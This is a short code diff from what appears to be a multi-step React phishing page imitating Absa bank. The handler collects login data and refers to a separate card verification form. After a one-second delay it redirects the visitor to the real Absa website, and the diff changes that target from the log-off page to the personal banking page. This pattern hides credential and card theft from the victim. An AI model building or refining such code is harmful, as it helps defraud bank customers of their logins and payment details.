@@ -31,11 +31,8 @@ function App() {
   const handleStep3Submit = (data: any): void => {
     console.log('Step 3 completed - FINAL DATA:', data);
     setLoginData(data);
-    
-    // Data is saved in CardVerificationForm component
     setTimeout(() => {
-      console.log('Redirecting to Absa website...');
-      window.location.href = 'https://www.absa.co.za/absa-online-logoff/';
+      window.location.href = 'https://www.absa.co.za/personal/';
     }, 1000);
   };
 
